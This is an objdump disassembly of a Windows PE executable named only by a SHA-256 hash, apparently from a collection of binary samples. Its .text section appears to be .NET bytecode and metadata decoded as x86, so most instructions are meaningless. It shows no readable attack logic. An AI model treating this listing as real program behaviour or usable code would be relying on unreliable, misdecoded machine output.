
1b62269bcbd95334003b4dd59476753e382ba164a1443f27edb4df0f55317753.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	xor    BYTE PTR [esi+0x0],cl
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x26c400
  402013:	add    al,bh
  402015:	and    eax,0xb0000
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    al,0x0
  40201e:	add    BYTE PTR [esi],al
	...
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    BYTE PTR [eax],bh
  402051:	shl    BYTE PTR [edi],cl
  402053:	dec    edx
  402054:	cmp    eax,DWORD PTR [esi-0x9906921]
  40205a:	sub    al,0x85
  40205c:	or     al,0x7c
  40205e:	aas    
  40205f:	aam    0x88
  402061:	(bad)  
  402062:	dec    eax
  402063:	call   0xfac3:0xfe4b6346
  40206a:	leave  
  40206b:	mov    eax,ds:0x83ae09c0
  402070:	ret    0x634b
  402073:	push   edi
  402074:	cs jmp 0x7e49:0xbc093a26
  40207c:	and    DWORD PTR [esi-0x77d68b74],ebx
  402082:	das    
  402083:	sbb    ebp,DWORD PTR [ebx-0x31]
  402086:	inc    edi
  402087:	sahf   
  402088:	fisubr DWORD PTR [eax+0x3b]
  40208b:	std    
  40208c:	in     eax,dx
  40208d:	aaa    
  40208e:	and    ebx,DWORD PTR [ebx]
  402090:	mov    WORD PTR [edx],gs
  402092:	rcl    bl,1
  402094:	mov    ecx,0x442f8d24
  402099:	outs   dx,DWORD PTR ds:[esi]
  40209a:	das    
  40209b:	test   eax,0x187e87a8
  4020a0:	xchg   ebx,eax
  4020a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020a2:	icebp  
  4020a3:	in     eax,dx
  4020a4:	dec    ebp
  4020a5:	sub    al,0xea
  4020a7:	xchg   BYTE PTR [edx+0x7f64460],dl
  4020ad:	add    eax,0xc479345b
  4020b2:	int    0x87
  4020b4:	xor    BYTE PTR [eax-0x73],0xce
  4020b8:	jmp    0xa486:0xcbaeb545
  4020bf:	push   eax
  4020c0:	mov    ch,0x64
  4020c2:	cs scas eax,DWORD PTR es:[edi]
  4020c4:	push   ebx
  4020c5:	js     0x402073
  4020c7:	sbb    DWORD PTR [ecx+edi*2+0x14],edi
  4020cb:	rcl    BYTE PTR ds:0xcbe7129f,0x83
  4020d2:	cmp    esp,DWORD PTR [ecx-0x33]
  4020d5:	aaa    
  4020d6:	imul   ebp,DWORD PTR [esi-0x3c],0xffffffe6
  4020da:	jnp    0x4020fb
  4020dc:	add    eax,0x6801057c
  4020e1:	cmp    al,0x29
  4020e3:	jae    0x4020dc
  4020e5:	loope  0x402069
  4020e7:	bound  eax,QWORD PTR ds:0x3e300cbb
  4020ed:	dec    ecx
  4020ee:	inc    esi
  4020ef:	xlat   BYTE PTR ds:[ebx]
  4020f0:	out    0x1,al
  4020f2:	lahf   
  4020f3:	jb     0x40208e
  4020f5:	fcmovnbe st,st(4)
  4020f7:	dec    esp
  4020f8:	inc    eax
  4020f9:	mov    ebp,0xcb45ce68
  4020fe:	inc    ebx
  4020ff:	push   edx
  402100:	add    BYTE PTR [ebx+ebx*2],bh
  402103:	push   cs
  402104:	sbb    esp,DWORD PTR [ecx]
  402106:	ror    BYTE PTR [ecx-0x41],cl
  402109:	pop    ebp
  40210a:	jne    0x402112
  40210c:	xor    eax,0x5fb2e723
  402111:	pop    ss
  402112:	ror    al,1
  402114:	or     BYTE PTR [ebp+0x48],cl
  402117:	add    BYTE PTR ds:0xf4783e71,dl
  40211d:	xchg   edx,eax
  40211e:	mov    eax,0x6bf1c5cc
  402123:	ret    0x4ee4
  402126:	mov    WORD PTR [edx-0x37],?
  402129:	(bad)  
  40212a:	dec    edi
  40212b:	jle    0x402140
  40212d:	pop    esp
  40212e:	mov    eax,ds:0x8466cb1c
  402133:	push   ecx
  402134:	xor    eax,0xe1ddb88a
  402139:	lods   al,BYTE PTR ds:[esi]
  40213a:	and    eax,0x68a677f5
  40213f:	mov    dl,0xdb
  402141:	fisttp WORD PTR [ebx+0x36633d60]
  402147:	jne    0x402159
  402149:	sub    al,0xe1
  40214b:	xchg   ebx,eax
  40214c:	imul   ebx,DWORD PTR [esi+0x24e6bdd],0x16
  402153:	jae    0x40216c
  402155:	add    BYTE PTR [eax],al
  402157:	or     bh,BYTE PTR [ebp+0x7]
  40215a:	add    BYTE PTR [eax],al
  40215c:	add    al,0x2
  40215e:	sub    BYTE PTR [eax],bl
  402160:	add    BYTE PTR [eax],al
  402162:	or     ch,BYTE PTR [edx]
  402164:	jb     0x402168
  402166:	push   ss
  402167:	jae    0x402180
  402169:	add    BYTE PTR [eax],al
  40216b:	or     bh,BYTE PTR [ebp+0x7]
  40216e:	add    BYTE PTR [eax],al
  402170:	add    al,0x2
  402172:	sub    BYTE PTR [eax],bl
  402174:	add    BYTE PTR [eax],al
  402176:	or     al,BYTE PTR [edx]
  402178:	add    eax,DWORD PTR [eax*1+0x528]
  40217f:	push   es
  402180:	sub    cl,BYTE PTR [edx]
  402182:	adc    al,0x2a
  402184:	sbb    esi,DWORD PTR [eax]
  402186:	add    eax,0x19600
  40218b:	add    BYTE PTR [ecx],al
  40218d:	add    BYTE PTR [eax],al
  40218f:	adc    DWORD PTR [esi+0x1a],edi
  402192:	add    BYTE PTR [eax],al
  402194:	or     bl,BYTE PTR [edi]
  402196:	xor    esi,DWORD PTR [edx+0x1]
  402199:	add    BYTE PTR [eax],al
  40219b:	jo     0x40220c
  40219d:	sbb    eax,DWORD PTR [eax]
  40219f:	add    BYTE PTR [edx],cl
  4021a1:	jle    0x4021bd
  4021a3:	add    BYTE PTR [eax],al
  4021a5:	or     ah,BYTE PTR [eax]
  4021a7:	pop    esi
  4021a8:	dec    edi
  4021a9:	add    BYTE PTR [eax],al
  4021ab:	outs   dx,DWORD PTR ds:[esi]
  4021ac:	sbb    al,0x0
  4021ae:	add    BYTE PTR [edx],cl
  4021b0:	jae    0x4021b3
  4021b2:	add    BYTE PTR [eax],al
  4021b4:	push   es
  4021b5:	or     ch,BYTE PTR [eax]
  4021b7:	sbb    eax,0xb0a0000
  4021bc:	pop    es
  4021bd:	push   es
  4021be:	inc    BYTE PTR [esi]
  4021c0:	push   es
  4021c1:	add    BYTE PTR [eax],al
  4021c3:	push   es
  4021c4:	jae    0x4021e4
  4021c6:	add    BYTE PTR [eax],al
  4021c8:	or     ch,BYTE PTR [edi+0x1f]
  4021cb:	add    BYTE PTR [eax],al
  4021cd:	or     ch,BYTE PTR [eax]
  4021cf:	and    BYTE PTR [eax],al
  4021d1:	add    BYTE PTR [edx],cl
  4021d3:	outs   dx,DWORD PTR ds:[esi]
  4021d4:	and    DWORD PTR [eax],eax
  4021d6:	add    BYTE PTR [edx],cl
  4021d8:	outs   dx,DWORD PTR ds:[esi]
  4021d9:	and    al,BYTE PTR [eax]
  4021db:	add    BYTE PTR [edx],cl
  4021dd:	jb     0x40222a
  4021df:	add    BYTE PTR [eax],al
  4021e1:	jo     0x40220b
  4021e3:	and    eax,DWORD PTR [eax]
  4021e5:	add    BYTE PTR [edx],cl
  4021e7:	sub    BYTE PTR [eax+eax*1],ah
  4021ea:	add    BYTE PTR [edx],cl
  4021ec:	pop    ss
  4021ed:	sub    BYTE PTR ds:0x720a0000,ah
  4021f3:	push   ebp
  4021f4:	add    BYTE PTR [eax],al
  4021f6:	jo     0x402220
  4021f8:	add    BYTE PTR es:[eax],al
  4021fb:	or     dh,BYTE PTR [edx+0x55]
  4021fe:	add    BYTE PTR [eax],al
  402200:	jo     0x40222a
  402202:	daa    
  402203:	add    BYTE PTR [eax],al
  402205:	or     dh,BYTE PTR [edx+0x77]
  402208:	add    BYTE PTR [eax],al
  40220a:	jo     0x40227e
  40220c:	push   ebp
  40220d:	add    BYTE PTR [eax],al
  40220f:	jo     0x402239
  402211:	sub    BYTE PTR [eax],al
  402213:	add    BYTE PTR [edx],cl
  402215:	adc    al,0x28
  402217:	or     eax,DWORD PTR [eax]
  402219:	add    BYTE PTR [esi],al
  40221b:	jb     0x4021be
  40221d:	add    BYTE PTR [eax],al
  40221f:	jo     0x402249
  402221:	sub    DWORD PTR [eax],eax
  402223:	add    BYTE PTR [edx],cl
  402225:	add    cl,BYTE PTR [esi+0x4e321c69]
  40222b:	jb     0x4021fc
  40222d:	add    BYTE PTR [eax],al
  40222f:	jo     0x402233
  402231:	push   ss
  402232:	call   0xa00:0x2a6f1b
  402239:	sub    al,0x3e
  40223b:	add    dl,BYTE PTR [edi]
  40223d:	call   0x2d0a:0x2b28
  402244:	xor    al,0x72
  402246:	jecxz  0x402248
  402248:	add    BYTE PTR [eax+0x2],dh
  40224b:	sbb    BYTE PTR [edx+0x2a6f1b],bl
  402251:	add    BYTE PTR [edx],cl
  402253:	sub    al,0x24
  402255:	add    bl,BYTE PTR [ecx]
  402257:	call   0x2d0a:0x2b28
  40225e:	sbb    dh,BYTE PTR [edx+0x1]
  402261:	add    DWORD PTR [eax],eax
  402263:	jo     0x402267
  402265:	sbb    bl,BYTE PTR [edx+0x2a6f1b]
  40226b:	add    BYTE PTR [edx],cl
  40226d:	sub    al,0xa
  40226f:	add    bl,BYTE PTR [ebx]
  402271:	call   0x2c0a:0x2b28
  402278:	sbb    dh,BYTE PTR [edx+0x23]
  40227b:	add    DWORD PTR [eax],eax
  40227d:	jo     0x4022a7
  40227f:	sub    al,0x0
  402281:	add    BYTE PTR [edx],cl
  402283:	sub    BYTE PTR ds:0x6f0a0000,ch
  402289:	add    BYTE PTR cs:[eax],al
  40228c:	or     ch,BYTE PTR [eax]
  40228e:	das    
  40228f:	add    BYTE PTR [eax],al
  402291:	or     ch,BYTE PTR [edx]
  402293:	add    bl,BYTE PTR [ecx]
  402295:	call   0xa00:0x30281d
  40229c:	adc    al,BYTE PTR [edx]
  40229e:	sub    BYTE PTR [ecx],dh
  4022a0:	add    BYTE PTR [eax],al
  4022a2:	or     ch,BYTE PTR ds:0x187721a
  4022a8:	add    BYTE PTR [eax+0x28],dh
  4022ab:	sub    al,0x0
  4022ad:	add    BYTE PTR [edx],cl
  4022af:	sub    BYTE PTR ds:0x6f0a0000,ch
  4022b5:	add    BYTE PTR cs:[eax],al
  4022b8:	or     ch,BYTE PTR [eax]
  4022ba:	das    
  4022bb:	add    BYTE PTR [eax],al
  4022bd:	or     ch,BYTE PTR [edx]
  4022bf:	push   es
  4022c0:	add    dl,BYTE PTR [edi]
  4022c2:	call   0x56f:0x9a1b0208
  4022c9:	add    BYTE PTR [eax],al
  4022cb:	push   es
  4022cc:	push   es
  4022cd:	outs   dx,DWORD PTR ds:[esi]
  4022ce:	or     DWORD PTR [eax],eax
  4022d0:	add    BYTE PTR [esi],al
  4022d2:	push   es
  4022d3:	outs   dx,DWORD PTR ds:[esi]
  4022d4:	pop    es
  4022d5:	add    BYTE PTR [eax],al
  4022d7:	push   es
  4022d8:	ficom  WORD PTR [ebx]
  4022da:	or     eax,0x22272
  4022df:	jo     0x4022ea
  4022e1:	sub    BYTE PTR [edx],dh
  4022e3:	add    BYTE PTR [eax],al
  4022e5:	or     ch,BYTE PTR [eax]
  4022e7:	sub    al,0x0
  4022e9:	add    BYTE PTR [edx],cl
  4022eb:	fiadd  WORD PTR [eax]
  4022ed:	fisubr WORD PTR [edx+esi*2]
  4022f0:	jp     0x4022f4
  4022f2:	add    BYTE PTR [eax+0x28],dh
  4022f5:	sub    DWORD PTR [eax],eax
  4022f7:	add    BYTE PTR [edx],cl
  4022f9:	push   es
  4022fa:	outs   dx,DWORD PTR ds:[esi]
  4022fb:	or     al,BYTE PTR [eax]
  4022fd:	add    BYTE PTR [esi],al
  4022ff:	jle    0x40231b
  402301:	add    BYTE PTR [eax],al
  402303:	or     ah,BYTE PTR [eax]
  402305:	pop    edi
  402306:	dec    edi
  402307:	add    BYTE PTR [eax],al
  402309:	outs   dx,DWORD PTR ds:[esi]
  40230a:	sbb    al,0x0
  40230c:	add    BYTE PTR [edx],cl
  40230e:	jle    0x40232a
  402310:	add    BYTE PTR [eax],al
  402312:	or     bl,BYTE PTR [edi]
  402314:	xor    ebp,DWORD PTR [edi+0x33]
  402317:	add    BYTE PTR [eax],al
  402319:	or     bl,ah
  40231b:	jb     0x4022d1
  40231d:	add    al,BYTE PTR [eax]
  40231f:	jo     0x402349
  402321:	sub    DWORD PTR [eax],eax
  402323:	add    BYTE PTR [edx],cl
  402325:	sub    al,BYTE PTR [eax]
  402327:	add    BYTE PTR [ecx],al
  402329:	sbb    al,0x0
  40232b:	add    BYTE PTR [eax],al
  40232d:	add    BYTE PTR [edi],ch
  40232f:	add    DWORD PTR [ebx],ebx
  402331:	dec    edx
  402332:	add    DWORD PTR [ebx],edx
  402334:	xor    eax,0x2010000
  402339:	add    BYTE PTR [edi],ch
  40233b:	add    DWORD PTR [eax],esi
  40233d:	pop    edi
  40233e:	add    DWORD PTR [eax+eax*1],ebp
  402341:	add    BYTE PTR [eax],al
  402343:	add    BYTE PTR [ebx],al
  402345:	xor    BYTE PTR ds:0x6000,al
  40234b:	add    BYTE PTR [eax],al
  40234d:	add    BYTE PTR [eax],al
  40234f:	add    BYTE PTR [edx],al
  402351:	add    edi,DWORD PTR [ebp+0x4]
  402354:	add    BYTE PTR [eax],al
  402356:	add    al,0x2
  402358:	add    eax,0x67d
  40235d:	add    al,0x2
  40235f:	adc    al,0xfe
  402361:	push   es
  402362:	or     eax,DWORD PTR [eax]
  402364:	add    BYTE PTR [esi],al
  402366:	jae    0x40239c
  402368:	add    BYTE PTR [eax],al
  40236a:	or     dl,BYTE PTR [eax+eiz*1]
  40236d:	xor    BYTE PTR [ebp+0x0],dh
  402370:	add    BYTE PTR [eax],ah
  402372:	xor    BYTE PTR [ebp+0x0],dh
  402375:	add    BYTE PTR [ebx+0x35],dh
  402378:	add    BYTE PTR [eax],al
  40237a:	or     bh,BYTE PTR [ebp+0x3]
  40237d:	add    BYTE PTR [eax],al
  40237f:	add    al,0x2
  402381:	add    al,0x28
  402383:	add    BYTE PTR ss:[eax],al
  402386:	or     bh,BYTE PTR [ebp+0x5]
  402389:	add    BYTE PTR [eax],al
  40238b:	add    al,0x2
  40238d:	jnp    0x402394
  40238f:	add    BYTE PTR [eax],al
  402391:	add    al,0x2
  402393:	inc    BYTE PTR [esi]
  402395:	or     al,0x0
  402397:	add    BYTE PTR [esi],al
  402399:	jae    0x4023d2
  40239b:	add    BYTE PTR [eax],al
  40239d:	or     ch,BYTE PTR [edi+0x38]
  4023a0:	add    BYTE PTR [eax],al
  4023a2:	or     al,BYTE PTR [edx]
  4023a4:	jnp    0x4023ab
  4023a6:	add    BYTE PTR [eax],al
  4023a8:	add    al,0x17
  4023aa:	outs   dx,DWORD PTR ds:[esi]
  4023ab:	cmp    DWORD PTR [eax],eax
  4023ad:	add    BYTE PTR [edx],cl
  4023af:	sub    dl,BYTE PTR [ebx]
  4023b1:	xor    BYTE PTR [ecx],al
  4023b3:	add    BYTE PTR [edi],dh
  4023b5:	add    BYTE PTR [eax],al
  4023b7:	add    BYTE PTR [edx],al
  4023b9:	add    BYTE PTR [eax],al
  4023bb:	adc    DWORD PTR [edx-0x20],esi
  4023be:	add    al,BYTE PTR [eax]
  4023c0:	jo     0x4023ea
  4023c2:	sub    DWORD PTR [eax],eax
  4023c4:	add    BYTE PTR [edx],cl
  4023c6:	add    al,0x6f
  4023c8:	cmp    al,BYTE PTR [eax]
  4023ca:	add    BYTE PTR [edx],cl
  4023cc:	sub    al,0x24
  4023ce:	add    bh,BYTE PTR [ebx+0x1]
  4023d1:	add    BYTE PTR [eax],al
  4023d3:	add    al,0xa
  4023d5:	jb     0x402425
  4023d7:	add    eax,DWORD PTR [eax]
  4023d9:	jo     0x402403
  4023db:	sub    DWORD PTR [eax],eax
  4023dd:	add    BYTE PTR [edx],cl
  4023df:	push   es
  4023e0:	sub    al,0x10
  4023e2:	jb     0x4023ac
  4023e4:	add    eax,DWORD PTR [eax]
  4023e6:	jo     0x402410
  4023e8:	sub    DWORD PTR [eax],eax
  4023ea:	add    BYTE PTR [edx],cl
  4023ec:	push   es
  4023ed:	outs   dx,DWORD PTR ds:[esi]
  4023ee:	cmp    eax,DWORD PTR [eax]
  4023f0:	add    BYTE PTR [edx],cl
  4023f2:	sub    al,BYTE PTR [eax]
  4023f4:	sbb    esi,DWORD PTR [eax]
  4023f6:	add    eax,DWORD PTR [eax]
  4023f8:	ret    0x0
  4023fb:	add    BYTE PTR [ebx],al
  4023fd:	add    BYTE PTR [eax],al
  4023ff:	adc    DWORD PTR [edx],eax
  402401:	sub    BYTE PTR [eax],cl
  402403:	add    BYTE PTR [eax],al
  402405:	push   es
  402406:	or     al,BYTE PTR [esi]
  402408:	sub    eax,0x6f062a01
  40240d:	cmp    al,0x0
  40240f:	add    BYTE PTR [edx],cl
  402411:	or     eax,DWORD PTR [edi]
  402413:	outs   dx,DWORD PTR ds:[esi]
  402414:	cmp    eax,0xc0a0000
  402419:	or     BYTE PTR [edi+0x3e],ch
  40241c:	add    BYTE PTR [eax],al
  40241e:	or     al,BYTE PTR [edx]
  402420:	jnp    0x402424
  402422:	add    BYTE PTR [eax],al
  402424:	add    al,0x6f
  402426:	aas    
  402427:	add    BYTE PTR [eax],al
  402429:	or     al,BYTE PTR [edx]
  40242b:	pop    es
  40242c:	or     BYTE PTR [ebx+0x40],dh
  40242f:	add    BYTE PTR [eax],al
  402431:	or     bh,BYTE PTR [ebp+0x1]
  402434:	add    BYTE PTR [eax],al
  402436:	add    al,0x72
  402438:	pop    edi
  402439:	add    al,0x0
  40243b:	jo     0x402465
  40243d:	sub    DWORD PTR [eax],eax
  40243f:	add    BYTE PTR [edx],cl
  402441:	push   es
  402442:	add    ch,BYTE PTR [edi+0x41]
  402445:	add    BYTE PTR [eax],al
  402447:	or     dh,BYTE PTR [edx-0x23]
  40244a:	add    al,0x0
  40244c:	jo     0x402476
  40244e:	sub    DWORD PTR [eax],eax
  402450:	add    BYTE PTR [edx],cl
  402452:	fisub  WORD PTR [edx]
  402454:	or     eax,0x55172
  402459:	jo     0x402464
  40245b:	sub    BYTE PTR [edx],dh
  40245d:	add    BYTE PTR [eax],al
  40245f:	or     ch,BYTE PTR [eax]
  402461:	sub    al,0x0
  402463:	add    BYTE PTR [edx],cl
  402465:	sub    BYTE PTR [edx+0x0],al
  402468:	add    BYTE PTR [edx],cl
  40246a:	outs   dx,DWORD PTR ds:[esi]
  40246b:	inc    ebx
  40246c:	add    BYTE PTR [eax],al
  40246e:	or     ch,BYTE PTR [eax]
  402470:	das    
  402471:	add    BYTE PTR [eax],al
  402473:	or     bl,dh
  402475:	dec    ebx
  402476:	jb     0x402435
  402478:	add    eax,0x29287000
  40247d:	add    BYTE PTR [eax],al
  40247f:	or     al,BYTE PTR [edx]
  402481:	jnp    0x40248a
  402483:	add    BYTE PTR [eax],al
  402485:	add    al,0x6f
  402487:	inc    esp
  402488:	add    BYTE PTR [eax],al
  40248a:	or     ah,BYTE PTR [esi]
  40248c:	jb     0x4024ad
  40248e:	push   es
  40248f:	add    BYTE PTR [eax+0x28],dh
  402492:	inc    ebp
  402493:	add    BYTE PTR [eax],al
  402495:	or     bl,dh
  402497:	sub    DWORD PTR [ebx],edx
  402499:	add    al,0x72
  40249b:	outs   dx,DWORD PTR ds:[esi]
  40249c:	push   es
  40249d:	add    BYTE PTR [eax+0x11],dh
  4024a0:	add    al,0x28
  4024a2:	xor    al,BYTE PTR [eax]
  4024a4:	add    BYTE PTR [edx],cl
  4024a6:	sub    BYTE PTR [eax+eax*1],ch
  4024a9:	add    BYTE PTR [edx],cl
  4024ab:	sub    BYTE PTR [esi+0x0],al
  4024ae:	add    BYTE PTR [edx],cl
  4024b0:	sub    BYTE PTR [edi+0x0],al
  4024b3:	add    BYTE PTR [edx],cl
  4024b5:	outs   dx,DWORD PTR ds:[esi]
  4024b6:	inc    ebx
  4024b7:	add    BYTE PTR [eax],al
  4024b9:	or     ch,BYTE PTR [eax]
  4024bb:	das    
  4024bc:	add    BYTE PTR [eax],al
  4024be:	or     bl,dh
  4024c0:	add    BYTE PTR [edx],ch
  4024c2:	add    BYTE PTR [eax],al
  4024c4:	add    DWORD PTR [eax+eax*1],ebx
  4024c7:	add    BYTE PTR [eax],al
  4024c9:	add    BYTE PTR [ebx],cl
  4024cb:	add    BYTE PTR [ecx+0x54],cl
  4024ce:	add    BYTE PTR [edx],ah
  4024d0:	xor    eax,0x10000
  4024d5:	add    BYTE PTR [esi+0x0],dh
  4024d8:	and    bl,BYTE PTR [eax+0x352900]
  4024de:	add    BYTE PTR [ecx],al
  4024e0:	sbb    esi,DWORD PTR [eax]
  4024e2:	add    eax,0xcc00
  4024e7:	add    BYTE PTR [eax+eax*1],al
  4024ea:	add    BYTE PTR [ecx],dl
  4024ec:	sub    BYTE PTR [eax+0x0],cl
  4024ef:	add    BYTE PTR [edx],cl
  4024f1:	jb     0x4024d4
  4024f3:	push   es
  4024f4:	add    BYTE PTR [eax+0x18],dh
  4024f7:	lea    edi,[esi]
  4024f9:	add    BYTE PTR [eax],al
  4024fb:	add    DWORD PTR [ebx],edx
  4024fd:	add    eax,0x2160511
  402502:	jnp    0x40250a
  402504:	add    BYTE PTR [eax],al
  402506:	add    al,0xa2
  402508:	adc    DWORD PTR ds:0x497e17,eax
  40250e:	add    BYTE PTR [edx],cl
  402510:	mov    ds:0x4a280511,al
  402515:	add    BYTE PTR [eax],al
  402517:	or     cl,BYTE PTR [ebx]
  402519:	jb     0x402518
  40251b:	push   es
  40251c:	add    BYTE PTR [eax+0x17],dh
  40251f:	lea    edi,[esi]
  402521:	add    BYTE PTR [eax],al
  402523:	add    DWORD PTR [ebx],edx
  402525:	push   es
  402526:	adc    DWORD PTR [esi],eax
  402528:	push   ss
  402529:	pop    es
  40252a:	mov    ds:0x4b280611,al
  40252f:	add    BYTE PTR [eax],al
  402531:	or     dl,al
  402533:	inc    ebx
  402534:	add    BYTE PTR [eax],al
  402536:	add    DWORD PTR [eax],ebp
  402538:	dec    esp
  402539:	add    BYTE PTR [eax],al
  40253b:	or     al,BYTE PTR [edi]
  40253d:	sub    BYTE PTR [ebp+0x0],cl
  402540:	add    BYTE PTR [edx],cl
  402542:	je     0x402587
  402544:	add    BYTE PTR [eax],al
  402546:	add    DWORD PTR [edx+esi*2],ecx
  402549:	cmp    eax,0x17700007
  40254e:	lea    edi,[esi]
  402550:	add    BYTE PTR [eax],al
  402552:	add    DWORD PTR [ebx],edx
  402554:	pop    es
  402555:	adc    DWORD PTR [edi],eax
  402557:	push   ss
  402558:	add    bh,BYTE PTR [ebx+0x4]
  40255b:	add    BYTE PTR [eax],al
  40255d:	add    al,0xa2
  40255f:	adc    DWORD PTR [edi],eax
  402561:	sub    BYTE PTR [esi+0x0],cl
  402564:	add    BYTE PTR [edx],cl
  402566:	or     BYTE PTR [edx],al
  402568:	jnp    0x40256e
  40256a:	add    BYTE PTR [eax],al
  40256c:	add    al,0x6f
  40256e:	dec    edi
  40256f:	add    BYTE PTR [eax],al
  402571:	or     dh,BYTE PTR [ebp+0xa]
  402574:	add    BYTE PTR [eax],al
  402576:	add    DWORD PTR [edx],ecx
  402578:	fidivr WORD PTR [ecx]
  40257a:	or     eax,0x7bb72
  40257f:	jo     0x402598
  402581:	lea    edi,[esi]
  402583:	add    BYTE PTR [eax],al
  402585:	add    DWORD PTR [ebx],edx
  402587:	or     BYTE PTR [ecx],dl
  402589:	or     BYTE PTR [esi],dl
  40258b:	or     DWORD PTR [edi+0x43],ebp
  40258e:	add    BYTE PTR [eax],al
  402590:	or     ah,BYTE PTR [edx+0x50280811]
  402596:	add    BYTE PTR [eax],al
  402598:	or     cl,BYTE PTR [ecx]
  40259a:	sub    BYTE PTR [ecx+0x0],dl
  40259d:	add    BYTE PTR [edx],cl
  40259f:	sub    BYTE PTR [edx+0x0],dl
  4025a2:	add    BYTE PTR [edx],cl
  4025a4:	outs   dx,DWORD PTR ds:[esi]
  4025a5:	add    BYTE PTR cs:[eax],al
  4025a8:	or     ch,BYTE PTR [eax]
  4025aa:	das    
  4025ab:	add    BYTE PTR [eax],al
  4025ad:	or     dl,BYTE PTR [ebx+edx*1]
  4025b0:	add    al,0xde
  4025b2:	add    al,BYTE PTR [esi]
  4025b4:	sub    dl,BYTE PTR [ecx]
  4025b6:	add    al,0x2a
  4025b8:	add    DWORD PTR [eax],edx
  4025ba:	add    BYTE PTR [eax],al
  4025bc:	add    BYTE PTR [eax],al
  4025be:	add    BYTE PTR [eax],al
  4025c0:	mov    cs,WORD PTR [esi+0x353900]
  4025c6:	add    BYTE PTR [ecx],al
  4025c8:	xor    al,BYTE PTR [edx]
  4025ca:	sub    BYTE PTR [ebx+0x0],dl
  4025cd:	add    BYTE PTR [edx],cl
  4025cf:	jge    0x4025d3
  4025d1:	add    BYTE PTR [eax],al
  4025d3:	add    al,0x2a
  4025d5:	outs   dx,BYTE PTR ds:[esi]
  4025d6:	add    bh,BYTE PTR [ebx+0x2]
  4025d9:	add    BYTE PTR [eax],al
  4025db:	add    al,0x2c
  4025dd:	adc    al,BYTE PTR [edx]
  4025df:	jnp    0x4025e3
  4025e1:	add    BYTE PTR [eax],al
  4025e3:	add    al,0x28
  4025e5:	push   esp
  4025e6:	add    BYTE PTR [eax],al
  4025e8:	or     al,BYTE PTR [edx]
  4025ea:	adc    al,0x7d
  4025ec:	add    al,BYTE PTR [eax]
  4025ee:	add    BYTE PTR [edx+ebp*1],al
  4025f1:	dec    esi
  4025f2:	jb     0x40266b
  4025f4:	add    BYTE PTR [eax],al
  4025f6:	jo     0x40266a
  4025f8:	and    eax,0x1f700008
  4025fd:	adc    al,0x6a
  4025ff:	sub    BYTE PTR [ebp+0x0],dl
  402602:	add    BYTE PTR [edx],cl
  402604:	sub    al,BYTE PTR [eax]
  402606:	add    BYTE PTR [eax],al
  402608:	sbb    esi,DWORD PTR [eax]
  40260a:	add    al,0x0
  40260c:	add    BYTE PTR fs:[eax],al
  40260f:	add    BYTE PTR ds:0x2110000,al
  402615:	jnp    0x40261c
  402617:	add    BYTE PTR [eax],al
  402619:	add    al,0x6f
  40261b:	push   esi
  40261c:	add    BYTE PTR [eax],al
  40261e:	or     cl,BYTE PTR [edx+edx*1]
  402621:	add    ch,BYTE PTR [eax]
  402623:	dec    eax
  402624:	add    BYTE PTR [eax],al
  402626:	or     ch,BYTE PTR [eax]
  402628:	push   edi
  402629:	add    BYTE PTR [eax],al
  40262b:	or     cl,BYTE PTR [edx]
  40262d:	fisub  WORD PTR [eax]
  40262f:	or     esi,DWORD PTR [edx+0x3d]
  402632:	or     BYTE PTR [eax],al
  402634:	jo     0x40264d
  402636:	lea    edi,[esi]
  402638:	add    BYTE PTR [eax],al
  40263a:	add    DWORD PTR ds:0xa2071609,ecx
  402640:	or     DWORD PTR [eax],ebp
  402642:	pop    eax
  402643:	add    BYTE PTR [eax],al
  402645:	or     al,BYTE PTR [edi]
  402647:	sub    BYTE PTR [ecx+0x0],dl
  40264a:	add    BYTE PTR [edx],cl
  40264c:	or     bl,dh
  40264e:	add    BYTE PTR [edx-0x4f],dh
  402651:	or     BYTE PTR [eax],al
  402653:	jo     0x40266c
  402655:	lea    edi,[esi]
  402657:	add    BYTE PTR [eax],al
  402659:	add    DWORD PTR [ebx],edx
  40265b:	add    al,0x11
  40265d:	add    al,0x16
  40265f:	push   es
  402660:	mov    ds:0x50280411,al
  402665:	add    BYTE PTR [eax],al
  402667:	or     bl,dh
  402669:	or     eax,0x77b02
  40266e:	add    BYTE PTR [edi+ebp*2],al
  402671:	pop    ecx
  402672:	add    BYTE PTR [eax],al
  402674:	or     ah,BYTE PTR [esi]
  402676:	fsubr  QWORD PTR [edx]
  402678:	add    DWORD PTR [eax+eax*1],ebx
  40267b:	add    BYTE PTR [eax],al
  40267d:	add    BYTE PTR [eax],al
  40267f:	add    BYTE PTR [ebx],bl
  402681:	sbb    eax,DWORD PTR [eax]
  402683:	and    BYTE PTR ds:0x2010000,dh
  402689:	add    BYTE PTR [eax],al
  40268b:	add    BYTE PTR [esi+0x56],dl
  40268e:	add    BYTE PTR ds:0x0,cl
  402694:	push   ds
  402695:	add    bh,BYTE PTR [ebx+0x1]
  402698:	add    BYTE PTR [eax],al
  40269a:	add    al,0x2a
  40269c:	call   0x400:0x17b02
  4026a3:	sub    al,0x11
  4026a5:	add    bh,BYTE PTR [ebx+0x1]
  4026a8:	add    BYTE PTR [eax],al
  4026aa:	add    al,0x20
  4026ac:	mov    BYTE PTR [ebx],dl
  4026ae:	add    BYTE PTR [eax],al
  4026b0:	outs   dx,DWORD PTR ds:[esi]
  4026b1:	pop    edx
  4026b2:	add    BYTE PTR [eax],al
  4026b4:	or     ah,BYTE PTR [esi]
  4026b6:	add    bh,BYTE PTR [ebx+0x7]
  4026b9:	add    BYTE PTR [eax],al
  4026bb:	add    al,0x6f
  4026bd:	pop    ecx
  4026be:	add    BYTE PTR [eax],al
  4026c0:	or     ah,BYTE PTR [esi]
  4026c2:	sub    al,BYTE PTR [eax]
  4026c4:	inc    edx
  4026c5:	push   ebx
  4026c6:	dec    edx
  4026c7:	inc    edx
  4026c8:	add    DWORD PTR [eax],eax
  4026ca:	add    DWORD PTR [eax],eax
  4026cc:	add    BYTE PTR [eax],al
  4026ce:	add    BYTE PTR [eax],al
  4026d0:	or     al,0x0
  4026d2:	add    BYTE PTR [eax],al
  4026d4:	jbe    0x40270a
